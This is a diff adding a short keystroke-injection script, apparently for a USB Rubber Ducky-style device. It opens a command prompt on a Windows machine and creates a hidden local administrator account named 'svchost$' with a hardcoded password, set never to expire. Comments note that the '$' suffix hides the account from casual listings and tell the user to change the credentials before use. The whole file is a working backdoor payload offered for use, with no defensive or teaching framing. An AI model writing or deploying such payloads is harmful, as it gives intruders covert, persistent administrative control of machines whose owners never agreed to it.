@@ -1,0 +1,7 @@
+REM Add hidden local admin account
+REM CHANGE: username (svchost$) and password before use
+REM $ suffix hides it from casual net user listings
+GUI r
+DELAY 800
+STRING cmd /k "net user svchost$ Z1ll@St1ck! /add /active:yes /comment:System & net localgroup administrators svchost$ /add & net user svchost$ /expires:never & echo [+] Done"
+ENTER
